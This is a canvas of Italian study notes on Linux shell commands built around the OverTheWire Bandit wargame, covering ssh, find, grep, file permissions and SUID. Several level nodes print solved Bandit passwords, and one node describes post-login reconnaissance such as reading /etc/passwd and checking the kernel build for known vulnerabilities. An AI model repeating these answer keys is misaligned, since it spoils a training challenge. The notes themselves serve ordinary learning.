		{"id":"84fe8493ed579e54","type":"text","text":"# Shell vs TTY vs Terminale\n\nSe la `shell` è l'interprete di comandi, una ***TTY*** (`Teletypewriter`) è un'interfaccia che permette di parlare con essa (chiamata così perché nelle prime implementazioni era letteralmente una tastiera fisica).\n\nOgni `TTY` ha una propria `shell` (o diverse, e.g. usando `tmux` o `screen`) con i propri parametri. Quando avvii un SO `Linux` ce ne sono diverse, e puoi passare da una all'altra con `CTRL+ALT+FX`, dove `F1, F2` o `F7` tipicamente hanno sopra un ambiente grafico (e.g. ***Wayland*** o ***X11***), mentre le altre sono interfacce \"vecchio stile\" (dalle quali volendo posso far partire un ambiente grafico, e.g. con `startx`). Segue che su diverse `TTY` posso avere diverse sessioni grafiche con diversi utenti loggati in parallelo.\n\nUn ***terminale*** è una qualsiasi applicazione che si collega ad una `TTY` e permette di interagire con esso. Puoi farci tutto ciò che fai su una `TTY`, più altra roba come scrolling, palette cromatica, font personalizzati e simili.\n\nQuesta roba viene approfondita in un riquadro verso il ***livello 17*** (cfr. `(non-)login shell`, `/etc/profile` e `.bashrc`).","x":-1788,"y":3752,"width":759,"height":686,"color":"4"},
		{"id":"4282f1f0f685c1b7","type":"text","text":"# `ssh-keygen` e Chiavi Asimmetriche\n\nSe non ti va di mettere la password ad ogni connessione (anche perché mandarla ogni volta in giro su Internet è una potenziale vulnerabilità) puoi creare una ***coppia di chiavi*** con il comando ***`ssh-keygen`*** e copiare la chiave pubblica sulla macchina remota con `ssh-copy-id user@host`. La scrittura più generale possibile è`ssh-keygen [opzioni] -t <algoritmo> [opzioni dell'algoritmo]`, dove\n\n- le `[opzioni]` includono `-f <file>` (specifica il file di output in cui vengono salvate le chiavi), `-C \"comment\"` (inserisce un commento, tipo \"`Chiave per GitHub`\"), `-N \"passphrase\"` (protegge l'accesso alla chiave privata), `-q` (modalità \"silenziosa\") e `-y` (data una chiave privata, ne estrae la pubblica);\n- `-t <algoritmo>` è in realtà facoltativo (in assenza di specifica si usa ***RSA*** con chiave a `3072 bit`), ma si usa in genere ***ed25519***, che rappresenta un buon compromesso tra sicurezza e velocità;\n- le `[opzioni dell'algoritmo]` si riducono di norma alla lunghezza della chiave (`-b`), ma ad esempio `ed25519` usa sempre chiavi a `256 bit`.\n\nLe chiavi private vengono salvate di default in `~/.ssh`, dove posso creare e settare un file `config` per specificare quale chiave usare per quale server (altrimenti, in modo molto poco furbo, `ssh` le prova tutte!).\n\n```\nHost mio-server\n    HostName server.example.com\n    User utente\n    IdentityFile ~/.ssh/mia_chiave\n```","x":-779,"y":3752,"width":759,"height":686,"color":"4"},
		{"id":"22dfa299c258426a","type":"text","text":"# SSH - `ssh [options] user@host`\n\n***Secure Shell*** usa di norma la  ***porta 22*** per connettere il proprio terminale ad un terminale remoto eseguito come `user` all'indirizzo `host` (che può sia essere un indirizzo `IP` sia un nome, che verrà in caso risolto da DNS).\n\nQuesto non significa che puoi entrare a caso nei sistemi altrui. Il campo `user` deve essere un utente registrato su quell'`host`, e ti verrà richiesta la sua `password`.\n\nLe opzioni di base includono\n\n- `-p 1234` - si connette alla porta `1234` invece che alla `22`;\n- `-i </path/to/key>` - specifica che chiave usare per la connessione;\n- `-T` - usalo se vuoi eseguire solo un comando (concatenato come \"`ssh -T user@host 'comando'`\" e poi chiudere la connessione, senza aprire una shell interattiva;\n- `-X` - se vuoi avviare applicazioni con una `GUI X11` sull'`host` remoto, questa opzione ti permette di visualizzare tale GUI sul tuo computer (risultato simile si ottiene con `-Y`, che ha meno restrizioni di sicurezza e in genere si usa se `-X` non funziona).\n\nUna sessione funzionante si termina con `exit` o `CTRL + D`, una \"rotta\" con `~.` (senza poi premere invio!), altrimenti killando il processo `ssh` da un altro terminale (se proprio devi).","x":230,"y":3827,"width":759,"height":536,"color":"6"},
		{"id":"b3872fe16b478ecb","type":"text","text":"# `inodes` e `filesystem`\n\nQuesta parte, premetto, è un po' un delirio. Spero di averci capito qualcosa.\n\nUno si immagina un `filesystem` come una struttura ad albero. In realtà non è così, perché posso creare dei link che collegano diversi nodi in modo non gerarchico: è un ***grafo aciclico diretto*** (***DAG***). E come rappresento un DAG? Ovviamente con una tabella in cui salvo i nodi (che chiamo ***inodes***) e cosa fanno, e.g. puntare a dei dati (`inode` di tipo `file`), puntare a elenchi di altri `inodes` (i.e. è una `directory`) o ad un altro `inode` (e.g. un `soft link` ad un `inode` di tipo `directory`, come avviene con `bin@`).\n\nOgni `filesystem` si presenta più o meno nello stesso modo. Prendiamone uno di tipo `ext4`.\n\n```bash\n+----------------+----------------+-----------------+---------------------+\n| Superblock     | Inode Table    | Data Blocks     | Journaling          |\n| (info su FS)   | (lista inode)  | (dati reali)    | (storico modifiche) |\n+----------------+----------------+-----------------+---------------------+\n```\n\nQuesta è la struttura di un ***file a blocchi***, che rappresenta un `filesystem`.\n\n- `superblock` - contiene i metadati come la `signature` (e.g. `0xEF53` identifica la formattazione `ext4`), lo stato del `filesystem` (e.g. `clean`, nessun problema, o `error`, ci sono problemi), dimensione dei vari blocchi e informazioni per gestire gli `inodes`;\n- `inode table` - contiene la logica con cui sono organizzati i dati. Ogni `filesystem` ha un `inode` di `root` da cui parte tutto, che ha sempre `numero` identificativo `1`;\n- `data blocks` - i dati veri e propri (e.g. blocchi puntati da `inodes` di tipo `file`);\n- `journaling` - lo storico modifiche dei blocchi e degli `inodes`.\n\nOttimo, quindi Linux ha un `filesystem`! ... ecco, non è così facile. Se così fosse, eseguendo `l -i` nella `root directory /` dovrei vedere tutti numeri di `inode` distinti. Ma se dico così ovviamente non succede questo: `/dev`, `/proc`, `/run` e `/sys` hanno tutte `inode 1`. Non solo! `/proc` e `/sys` risultano occupare `0` spazio su disco!\n\n... perché?!","x":4266,"y":2533,"width":759,"height":848,"color":"4"},
		{"id":"4e494b0e134ff4a7","type":"text","text":"# Bash - Trovare Cose nel `filesystem`: `find`\n\nForse il comando più potente di Linux. Per ***trovare `file` nel `filesystem`*** abbiamo\n\n```bash\nfind [path] [options] [criteria]\n```\n\n`[path]` è autoesplicativo: è il punto di partenza della ricerca. `[options]` e `[criteria]` vanno tipicamente insieme, perché posso cercare basandomi su\n\n- `-type` - il ***tipo*** di file. I più comuni sono `f` per i file \"standard\", `d` per le directory, `l` per i link simbolici, `c` per i file a caratteri (e.g. `/dev/tty`, terminale, o `/dev/random`,  generatore di numeri casuali), `b` per i file a blocchi (e.g. le partizioni come `/dev/sda` o `/dev/loop0`), `p` per i file `pipe` utili a far comunicare i processi tra loro ed `s` per i file di tipo `socket` (e.g. `Docker` si comporta come una specie di server interno al computer, ed ha un file `socket` a cui i processi devono mandare le richieste);\n\t- `-type` ricerca sostanzialmente sul tipo di ***inode***.\n- `-name` -  il ***nome*** del file. Come sintassi abbiamo `find /path -name \"criteri\"`;\n\t- Dentro i criteri posso usare le ***wildcard*** (o ***pathname expansions***) del `bash`:\n\t\t- `*` indica un numero qualsiasi di caratteri, `?` un singolo carattere, `{a, b}` esegue due comandi, uno per `a` e uno per `b` (e.g. `ls {giochi, libri}` legge sia la cartella `giochi` che la cartella `libri`);\n\t\t- `find / *_doc??.txt` cerca in tutto il `filesystem` tutti i file che iniziano con qualcosa (anche nulla!), poi hanno `_doc`, poi due caratteri qualsiasi e finiscono per `.txt`.\n\t- La variante `-iname` ignora la distinzione tra maiuscole e minuscole.\n- `-size` - la ***dimensione*** del file. Posso specificare una grandezza esatta o scrivere `+1G` (più grandi di `1 Gb`) e `-10M` (più piccoli di `1 MB`). Abbiamo `c` per i `byte` e `k` per i `kb`;\n- `-?time` - A seconda di `?` abbiamo una ricerca sui file `modificati` (`-mtime`, se ci riferiamo ai soli metadati abbiamo `-ctime`) e `letti` (`-atime`) negli ultimi  `tot` giorni;\n\t- `find /tmp -atime -1` restituisce i file letti nelle ultime 24 ore;\n\t- Varianti `-?min` per questa stessa cosa, ma con `tot` in minuti.\n- `-user`, `-group` - Specifica user e gruppo del file;\n- `-perm` - i ***permessi*** del file. Se cerco permessi specifici posso fare `-perm 400`, ma\n\t- Se mi interessano dei permessi minimi uso `-perm -400` (i.e. `trova tutti i file che possono essere letti dall'owner`) o in modo analogo `-perm -o=r`). In generale abbiamo `owner` (`u`), `group` (`g`), `others` (`o`) o `all` (`a`).","x":4266,"y":3617,"width":759,"height":957,"color":"6"},
		{"id":"7be47aaf1eeeeb0d","type":"text","text":"# Bash - Trovare Cose Velocemente: `locate`\n\nMentre `find` scorre ogni volta tutto l'albero del `filesystem`, `locate` costruisce e aggiorna periodicamente (ma ***non istantaneamente***!) un DB con le posizioni delle cose. \n\nSe cerco una roba che sta correttamente nel DB, `locate` è velocissima. Supporta le regex (se metto prima `-r`), come opzioni abbiamo `-i` (ignora `uppercase`), `-c` (mostra solo il numero di occorrenze trovate), `-b` (ricerca esatta, tipo `-w` di `grep`.\n\nPer aggiornare manualmente il DB, `sudo updatedb`.","x":4266,"y":4810,"width":759,"height":279,"color":"4"},
		{"id":"b008c9c94e60d49d","type":"text","text":"# Bash - Opzioni Avanzate per `find`\n\nPosso combinare diverse `options` con i classici operatori logici.\n\n- `AND` - è sottinteso (se proprio vuoi sarebbe `-a`, ma basta mettere più opzioni in fila;\n- `OR` - è `-o`, ma devi stare attento alle parentesi (che vanno messe con l'escape `\\`), e.g. `find /home -type f \\( -name \"*.mp3\" -o -name \"*.flac\" \\)`;\n- `NOT` - basta il `!`, seguito da spazio (non attaccarlo alla cosa da negare!).\n\nPosso limitare la profondità della ricerca (`-maxdepth`) o ignorare i primi livelli (`-mindepth`).\n\nMa `find` è più potente di una semplice ricerca, perché permette contestualmente di ***eseguire comandi sui file trovati***.\n\n- `-print` - Stampa il percorso completo dei file trovati;\n- `-delete` - Elimina direttamente tutto ciò che trova (***pericoloso!***);\n- `-exec` - Permette di eseguire ***qualsiasi comando `bash`*** sui file trovati.\n\t- `find / -name \"*.log\" -exec du -h {} \\;` - mostra la dimensione dei file trovati;\n\t\t- `{}` è un ***placeholder*** per la lista dei file che trova (quindi deve comparire in ogni comando che segue `-exec`);\n\t\t- `\\;` indica la fine del comando da eseguire per ogni file trovato. Bisogna mettere l'escape `\\` per evitare che la shell lo interpreti come concatenazione.\n\t- `find /home -name \"*.jpg\" -exec mv {} /backup/foto/ +` - Sposta tutti i file `.jpg` in una cartella di backup;\n\t\t- `+` serve ad eseguire la `mv` in parallelo, piuttosto che in serie.\n\t- Lasciamo ulteriori esempi in un quadratone a parte.\n\nAltri utilizzi furbi includono la ricerca di hard link duplicati e directory vuote:\n\n```bash\nfind / -samefile /path/to/file\nfind /home -type d -empty\n```","x":5275,"y":2533,"width":759,"height":848,"color":"4"},
		{"id":"2e2f2fffcb29a514","type":"text","text":"# Bash - Trovare Cose nei `file`: `grep`\n\n`grep - Global Regular Expression Print` è un altro dei comandi più potenti di Linux. ***Trova cose dentro ai file***.\n\n```bash\ngrep [options] pattern [file(s)]\n```\n\n`pattern` è una ***stringa*** o una ***regex***.\n\n- `pattern = \"^error\"` restituirà solo le occorrenze di `error` ad inizio riga. Analogo `\"error$\"` a fine riga;\n- `.` rappresenta un qualsiasi carattere singolo, `*` significa `0 o più occorrenze`, `[]` delimitano una classe di caratteri (e.g. `[0-9]*` significa `qualsiasi numero di cifre`);\n- Le parentesi `()` si usano per definire i gruppi di caratteri (e.g. `(ab)*`);\n\nPosso specificare più `file(s)` con le `wildcards`, mentre le opzioni...\n\n- `Ax`, `-By` - Mostrano rispettivamente `x` righe dopo il match e `y` righe prima;\n- `-c` - Restituisce il numero di righe che contengono il `pattern`;\n- `-E` estende le regex, permettendo di usare gli operatori `+` (`1 o più occorrenze`), `?` (`nessuno o un carattere qualsiasi`) e `|` (`OR logico`);\n\t- Posso usare direttamente il comando `egrep`$\\iff$ `grep -E`.\n- `-F` - Se invece voglio cercare una roba che sembra una regex ma non lo è (e.g. l'esatta occorrenza \"`.hello?`\", dove `.` è davvero un punto e `?` è davvero un punto interrogativo), devo disattivare l'interpretazione automatica delle regex, con `-F`;\n\t- Ottengo lo stesso risultato con il comando `fgrep`$\\iff$ `grep -F`.\n- `-o` - Mostra solo il match, non l'intera riga (utile se faccio una ricerca con una regex);\n- `-i` - Ignora la differenza tra maiuscole e minuscole;\n- `-r` - Ricerca ricorsivamente in tutte le sottodirectory, se `[file(s)]` è una `directory`;\n- `-v` - Inverte la ricerca, i.e. mostra solo le righe che ***non*** contengono `pattern`;\n- `-l` - Mostra solo i nomi dei file che contengono il pattern (e.g. utile con `-r`);\n\t- `-H` invece mostra ***anche*** il nome del file.\n- `-n` - Restituisce il numero di riga a cui è stato trovato il `pattern`;\n- `-w` - Trova solo le occorrenze esatte di `pattern` (e.g. mentre di norma se cerco `error` trovo anche cose tipo `error10`, con `-w` mi limito alle sole occorrenze di `error` isolato).\n","x":5275,"y":3617,"width":759,"height":957,"color":"4"},
		{"id":"625ede0e186681f5","type":"text","text":"# Level 6, 7, 8, 9\n\n6. Questa è una ricerca in tutto il filesystem partendo dalla radice e con criteri di dimensione e permessi. In questo caso è sufficiente `find / -type f -user bandit7 -group bandit6 2>/dev/null`.\n```\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n```\n\n7. Questa ricerca è ancora più facile, `cat data.txt | grep \"millionth` o `less data.txt` e poi `/millionth`.\n```\ndfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\n```\n\n8. Ok. Qua bisogna controllare il numero di occorrenze di un botto di roba. `grep -c` fa esattamente questo. Enumeriamo le righe con un `cat` in un ciclo `for` e stampiamo la riga che compare esattamente una volta:\n```bash\nfor line in $(cat data.txt); do if [[ $(grep -c \"$line\" data.txt) = 1 ]]; then echo $line; fi; done\n```\n- Questo ovviamente l'ho scritto prima di conoscere il comando `uniq`, che elimina le righe duplicate, ma ***adiacenti***. Fare `uniq -u data.txt` è quindi inutile, ma anche `sort -u` per qualche motivo non funziona. L'unico modo che ho trovato per farlo funzionare è `sort data.txt | strings | uniq -u`, una volta appurato che `sort` da solo funziona e che `strings` a quanto pare rende il tutto comprensibile per `uniq`. Vabbè, la chiave è\n\n```\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\n```\n\n9. Facile, `strings data.txt | grep \"===\"`.\n\n```\nFGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\n```","x":5275,"y":4810,"width":759,"height":858,"color":"4"},
		{"id":"e660a0288c5cee37","type":"text","text":"# Sì ok, ma che è il `Bash`?\n\nUna ***shell*** è un interprete dei comandi dell'utente verso il SO: se vuoi dire qualcosa al cuore del tuo computer devi parlare il suo linguaggio, o in alternativa un linguaggio che qualcuno (i.e. la shell) traduce in comandi comprensibili per il SO.\n\nNel tempo sono state create diverse `shell`, a cui corrispondono diversi linguaggi. ***Bash*** (***Bourne Again Shell***) è un'evoluzione della prima `shell`, chiamata ***sh*** (***Bourne Shell***, che è il tizio che l'ha sviluppata). In mezzo ci sta un tot di roba, in parte ancora utilizzata (e.g. `ksh`, ma anche `sh` per gli script di sistema) e in parte caduta nell'oblio (e.g. `csh`).\n\nCome detto, `sh` è ancora utilizzato per gli script di sistema in quanto leggero e veloce, ma non supporta molte delle cose che invece si possono usare in `bash` (e.g. uno script `bash` può usare gli array, verifica di condizioni con `[[ condition ]]` e brace expansions, tutte cose che se interpreto con `sh` mi danno errore perché non previste). Sistemi embedded o comunque poco potenti potrebbero supportare solo `sh`.\n\nGran parte dei comportamenti di default della tua `shell bash` sono definiti nel file `.bashrc` (cfr. ***Livello 17***).","x":-1788,"y":4790,"width":759,"height":894,"color":"4"},
		{"id":"f4f2a29153e51075","type":"text","text":"# Bash - Utility\n\n- `man [comando]` - Restituisce le istruzioni per il `comando`. Ha una vecchia versione basata su text editor chiamata `info`;\n- `apropos [pattern]` - Restituisce tutti i comandi che contengono `[pattern]` nella `SYNOPSIS` del manuale `man` (e.g. se voglio un comando che registra qualcosa potrei cercare `apropos capture`). Utile anche per capire quali comandi sono installati in una `shell` remota, o se ti ricordi cosa fa il `comando` ma non il nome;\n- `alias` - Restituisce tutti gli `alias`, definizioni homemade di comandi con diverse opzioni (e.g. `alias ll='ls -alF'`, i.e. se scrivo `ll` il terminale legge `ls -alf`);\n- `wc` - Restituisce il numero di  righe (`-l`), parole (`-w`) o `byte` (`char`, `-c`) di un `file1`. Se non specifico nessuna opzione, restituisce tutte queste cose in quest'ordine;\n- `du` - Disk Utilization della directory. Tipicamente utilizzato con opzioni `-ah` (restituisce il peso in formato leggibile di tutti i file della directory) o `-sh` (per le sole directory);\n- `sort` - Restituisce le righe di input in ordine lessicografico. Posso specificare `-n` (ordinamento numerico), `-r` (ordine inverso), `-u` (elimina i duplicati<span style=\"color:rgb(236, 155, 14)\">, in teoria, perché a me non ha mai funzionato</span>), `-k N` (ordina secondo la colonna `N`);\n- `strings` - Converte il contenuto di un file in stringhe stampabili;\n- `uniq` - Rimuove righe duplicate ***consecutive*** (quindi si usa spesso dopo `sort`). `-u` mostra solo le righe uniche, `-d` solo quelle duplicate, `-c` conta le occorrenze;\n\t- A me funziona solo come `sort data.txt | strings | uniq -u` (cfr. `livello 8`).\n- ","x":-1788,"y":5899,"width":759,"height":1219,"color":"3"},
		{"id":"0f2a36c9dcf84a3e","type":"text","text":"# Linux `Bash` Commands (Bandit)\n\nApprofonditi in ordine di come compaiono in [Bandit](https://overthewire.org/wargames/bandit/bandit0.html) e di come mi gira.\n\nSi accede al livello `N` del gioco loggando in `ssh` all'`host` `bandit.labs.overthewire.org` sulla porta `2220` mettendo come `user` `banditN` e come `password` quella ottenuta al livello `N-1`.\n\nLa sia username che password del livello zero sono `bandit0`. Nel seguito, il riquadro `Level N` contiene la soluzione per trovare la password del livello `N`.","x":-779,"y":5078,"width":759,"height":319,"color":"6"},
		{"id":"e218e0589f82e95a","type":"text","text":"# Premesse - Sistemi Operativi II","x":-779,"y":7782,"width":759,"height":240,"color":"6"},
		{"id":"7b351e91b16f865e","type":"text","text":"# Level 0\n\nLa password per il livello 1 si trova banalmente nel file `readme` del livello 0:\n\n```\nZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n```\n\nQuando fai `exit`, `SSH` ti avvisa se stai lasciando processi `running` o `stopped` (`CTRL + Z`). Se compare un `There are stopped/running jobs`, per non lasciare processi orfani fai\n\n```\nkill -9 $(jobs -p)\n```","x":230,"y":5077,"width":759,"height":319,"color":"4"},
		{"id":"1cdecb81c364493b","type":"text","text":"# Sono Dentro! Ora Cosa Faccio?\n\nBene, sono entrato in `ssh`. Sì, ma dove?\n\n- ***Kernel e SO*** - Posso stampare un riassunto con `uname -a`, che mostra \n\t- `nome_kernel`, e.g. `Linux`;\n\t- `hostname`, e.g. `my_pc`;\n\t- `versione_kernel`, e.g. `5.15.0-91-generic` (`generic` è la versione di Ubuntu);\n\t- `numero_build`, i.e. quante volte il kernel è stato ricompilato. In che senso? Quelli che distribuiscono il SO (e.g. ***Canonical*** per Ubuntu) non si mettono a firmare nuove versioni ad ogni minimo fix. Un aggiornamento minore (eseguito con `apt upgrade`) può includere una modifica al kernel ed una conseguente ricompilazione, che incrementa solo il numero di build, e.g. `#102-Ubuntu SMP Fri Jan 5 12:06:54 UTC 2024` (di norma ti dice anche quando è stato ricompilato l'ultima volta);\n\t\t- Se so che nella build `#102` c'è una ***vulnerabilità*** nota che è stata fixata solo successivamente (e.g. nella `#105`, l'ultima), posso sfruttarla per fare robe;\n\t\t- Se poi sono molto interessato a queste cose, con `cat /proc/version` trovo anche i dettagli sul tipo di compilatore usato.\n\t- `architettura`, e.g. `x86_64`;\n\t- `SO`, e.g. `GNU/Linux`;\n\t\t- Se mi interessa la distribuzione specifica del kernel, `cat /etc/os-release`. Questo in genere serve per capire la compatibilità dei SW che vuoi usare.\n- ***Chi sono io?*** - Potrei essere interessato a capire in qualità di che utente sono loggato.\n\t- `whoami` - Restituisce il nome dell'utente attuale (in teoria dovrei saperlo, se sono entrato con `ssh` dovrebbe coincidere con l'`user`);\n\t\t- <span style=\"color:rgb(236, 155, 14)\">Sono un utente standard o un account di servizio?</span> `cat /etc/passwd | grep $(whoami)` restituisce le righe del file `passwd` in cui compare il mio `user`. <span style=\"color:rgb(236, 155, 14)\">Se vedi qualcosa tipo `/bin/bash` o `/bin/sh` alla fine della riga, **sei un utente interattivo**. Se invece vedi `/usr/sbin/nologin` o `/bin/false`, è un account di servizio con accesso limitato.</span>\n\t- `id` - L'`user` è solo una label. Il SO mi identifica con un numero, detto ***UID***;\n\t\t- `0` corrisponde a `root`, `1-999` sono in genere utenti di sistema (e.g. servizi, demoni, ...) e `1000+` sono utenti normali;\n\t\t- Posso specificare `id -u mario` per sapere l'`UID` dell'utente `mario`;\n\t\t- A questo utente saranno associati anche dei gruppi, pertanto l'output di `id` sarà una lista `#id(group)` dove `#id` è il numero associato alla label `group`.\n- ***Chi sono gli altri?*** - Chi altro è loggato, e cosa sta facendo?\n\t- `who` e `w` permettono di vedere, rispettivamente, queste due cose;\n\t- `last` è uno storico degli accessi <span style=\"color:rgb(236, 155, 14)\">SSH</span>;\n- ***Cosa posso fare?*** - Per capirlo, mi serve sapere quali sono i miei privilegi. ","x":230,"y":5899,"width":759,"height":1219,"color":"3"},
		{"id":"52300a2aca6a3d2b","type":"text","text":"# Significato dei Permessi\n\nÈ chiaro cosa significa leggere, scrivere ed eseguire un `file`. Ma con una `directory`?\n\n- Leggere una `directory` significa listare il suo contenuto con `ls`. Questo include l'uso di `tab` per l'autocompletamento di un percorso;\n- Scrivere una `directory` significa creare, rimuovere o eliminare `file` in essa contenuti;\n- Eseguire una `directory` significa entrarci con `cd`. Questo include ***attraversarla***, i.e. se non sono autorizzato `x` e voglio accedere ad una cartella interna per la quale ho invece tutti i permessi, non posso farlo!\n\t- Questo limita anche il comando `ls`, che potrà solo listare i `file` senza poter visualizzare i dettagli (che appariranno come tanti simpatici `?`);\n\t- Se ho il permesso `x` ma non `r` e voglio attraversare la `directory` per giungere in luoghi sui quali ho autorizzazioni, posso farlo solo se conosco l'esatto `path` di destinazione (non posso usare `tab`!).\n\nNota che i permessi sui `file` e sulle `directory` sono completamente indipendenti. Posso ad esempio modificare un `file` su cui ho il permesso `w` che si trova in una `directory` in cui non ce l'ho (perché non lo sto rimuovendo o rinominando).\n\nPer gli altri tipi di `inodes` il significato è simile a quello dei `files` standard (nei symlink i permessi sono sostanzialmente dei placeholder, dipende dal file puntato).\n\nIndipendentemente dai permessi, il `superuser` è sempre in grado di fare quello che vuole.\n\nIl senso di tutto questo si vede analizzando i `gruppi`: chi è nel gruppo `dialout`, ad esempio, ha di norma i permessi per accedere ai dispositivi seriali. In modo analogo, `video` è il gruppo con i permessi per la `GPU` e simili, `shadow` ha accesso alle password (crittate).","x":2257,"y":2533,"width":759,"height":847,"color":"4"},
		{"id":"049e5ead3118c000","type":"text","text":"# Permessi Speciali & Access Control List (ACL)\n\nPotrei trovare cose diverse rispetto alla `x`, nei vari punti in cui dovrebbe comparire.\n\n- ***Set User ID*** (***SUID***) - Se trovo una `s` al posto della `x` sui permessi dell'`owner` significa che il `file` viene sempre eseguito con i privilegi dell'`owner`. Questo avviene ad esempio con `/usr/bin/passwd`, programma che serve a cambiare le password;\n\t- Aggiungo e rimuovo il `SUID` con `chmod u+s` e `chmod u-s`.\n- ***Set Group ID*** (***SGID***) - Se trovo una `s` al posto della `x` sui permessi del `group`, il `file` viene eseguito con i permessi del `gruppo`, e.g. tutti i file creati in una `directory` con `SGID` attivo erediteranno il gruppo della `directory` invece di quello del creatore;\n\t- Aggiungo e rimuovo il `SUID` con `chmod g+s dir` e `chmod g-s dir`;\n\t- Faccio questo esempio perché `SGID` tipicamente si usa sulle `directories`, mentre `SUID` si usa tipicamente sui `files` standard.\n- ***Sticky Bit*** - Se trovo una `t` al posto della `x` sui permessi degli `others` sto sicuramente guardando una `directory`, e l'effetto è il seguente: solo l'`owner` (e `root`, ovviamente) può cancellare/rinominare i file che compaiono nella `directory`.\n\t- Aggiungo e rimuovo `Sticky Bit` con `chmod +t dir` e `chmod -t dir`;\n\t- Utile per `directories` condivise, e.g. in `/tmp`.\n\nQuesti tre permessi speciali hanno a loro volta un trio di bit che definiscono se sono attivi o meno, nell'ordine `SUID SGID Sticky Bit`. `4xxx` indica un file con `SUID` attivo, `2xxx` analogo con `SGID` e `1xxx` analogo con `Sticky Bit`. Si sommano come i permessi standard (e.g. `6xxx` indica un oggetto con `SUID` e `SGID` entrambi attivi).\n\nInfine è possibile aggiungere permessi personalizzati per utenti e gruppi singoli tramite ***Access Control List*** (***ACL***). Controllo i permessi specifici con `getfacl file`, e li setto con\n\n```bash\nsetfacl [action] [target][permissions] [file]\n```\n\ndove `action` può essere un'aggiunta (`-m`) o una rimozione (`-x`), `target` può essere sia un `owner` (`u:username`) sia un gruppo (`g:groupname`) e i permessi sono i classici `rwx`.\n\nNota che questi permessi speciali non si vedono con `ls -l`, devo sempre usare `getfacl`.","x":2257,"y":3616,"width":759,"height":958,"color":"4"},
		{"id":"26065c6695f63b89","type":"text","text":"# Proprietari e Permessi\n\nQuando usi l'opzione `-l` in `ls` ci stanno diverse cose in output.\n```bash\n-rw-r--r-- 1 alice users 1234 Feb 21 12:00 file.txt\n```\n\n- Il primo `-` dell'esempio indica il tipo di `inode`, e può assumere gli stessi valori che specifico in una richiesta `-type` nel comando `find`;\n- I successivi `9` caratteri rappresentano i ***permessi*** per il ***proprietario*** (`alice`), per il ***gruppo*** (`users`) e, infine, per tutti gli ***altri*** (i.e. che non sono né `owner` né `group`);\n- Seguono numero di ***hard links***, dimensione, ultima modifica e nome del file.\n\nOgni gruppo di tre lettere (`rwx`) può essere rappresentato da una stringa binaria che ci dice cosa è attivo e cosa no (e.g. `101` $\\to$ `r-x`), ma possiamo ulteriormente comprimere questa informazione traducendola in decimale (e.g. `r-x` $\\to$ `101` $\\to$ `5`). Per questo, i permessi sono generalmente indicati con tre numeri da `0` a `7`.\n\nPosso modificare:\n\n- i permessi, con `chmod [perm] [file]`, dove `[perm]` può essere sia una sacra triade ottale come vista prima (e.g.  `755`) o singole aggiunte/rimozioni come `u+x` (aggiunge il permesso di esecuzione al proprietario), `g-w` (toglie la scrittura al gruppo) o `o+r` (aggiunge la lettura a `others`);\n\t- ***Solo il proprietario e root*** possono usare `chmod`, indipendentemente dai permessi di scrittura attuali (modificare i permessi non conta come scrittura sul `file`).\n- il proprietario e il gruppo, con `chown new_owner:new_group [file]`. `:new_group` è opzionale, posso cambiare solo lui con `chgrp`.\n\t- ***Solo root*** può usare `chown`.","x":3257,"y":2533,"width":759,"height":848,"color":"6"},
		{"id":"d8bd274b8f96df69","type":"text","text":"# Bash - Enumerare e Leggere Cose\n\nAnzitutto bisogna capire ***cosa c'è*** nella directory, con ***`ls`***. `-l` mostra i dettagli dei vari file: `permessi #hard_link proprietario gruppo dimensione(byte) ultima_modifica nome`.\n\n - Posso ordinare i file per dimensione (`-lS`) o per ultima modifica (`-lt`)\n- Altre opzioni rilevanti sono `-a` (mostra anche i file nascosti), `-R` (mostra in modo ricorsivo il contenuto di tutte le sotto-directory), `-h` (`dimensione` viene tradotta in un formato più leggibile, e.g. `Kb`, `Gb`), `-d` (mostra solo le directory), `-i` (mostra gli ***inode*** dei file) e `-1` (mostra i file in una sola colonna, utile per creare liste);\n- Posso anche combinarlo con altri comandi per filtrare l'output:\n\t- ``ls -lhS | head -n 10`` mostra i 10 file più pesanti in formato leggibile;\n\t- `ls -l *.txt` mostra solo i file con estensione `.txt` (senza usare `grep`!).\n\nUna volta capito cosa c'è, la prossima domanda può essere ***cosa c'è dentro ai file***.\n\n- ***`file`*** - Restituisce la ***codifica del contenuto*** di un `file1` (e.g. `ASCII`, `EXIF`). Questo perché ci metto un attimo a salvare un'immagine come `immagine.txt` nonostante non sia affatto un `.txt` (... o un malware come `file.innocuo`);\n- ***`more`*** or ***`less`*** - Entrambi servono per ***mostrare il contenuto*** di un `file1`.\n\t- `more` è la versione più datata, stampa una riga per volta e ti fa andare solo avanti;\n\t- `less` è una sorta di reader integrato (come può essere `nano` per gli editor di testo), permette di andare su e giù e supporta la ricerca (`/parola` per l'occorrenza successiva, `?parola` per quella precedente).\n\t\t- ***`man`*** usa `less` come reader, e pertanto supporta la ricerca in questo modo.\n- ***`head`*** or ***`tail`*** - Non sempre voglio leggere davvero tutto il file. `head` mostra ***solo le prime `10` righe*** (`-n N` per mostrarne `N`), `tail` le ***ultime*** `10` (anche qui `-n N`);\n\t- `tail` può seguire in diretta l'evoluzione di un file con `-f` (e.g. `tail -f log.txt | grep \"error\"`, stampa in diretta solo gli errori).\n- ***`cat`*** - Nato originariamente con l'idea di concatenare più file in uno solo (`cat file1 file2 > file3` concatena i file `1` e `2` a formare il `file3`) viene di fatto utilizzato per ***stampare roba*** (`cat file1` mostra il contenuto di `file1` su `stdout`);\n\t- Le opzioni `-n` e `-b` su un singolo `file1` restituiscono rispettivamente il numero di righe di `file1` ed il numero di righe non vuote, `-s` stampa `file1` riducendo ogni `N` righe vuote consecutive ad una sola;\n\t- Ha una utile variante `tac` per ***stampare i file al contrario***!\n\t- Va facilmente in combo con i comandi di lettura di prima (e.g. `cat file1 | less`).\n","x":3257,"y":3616,"width":759,"height":957,"color":"4"},
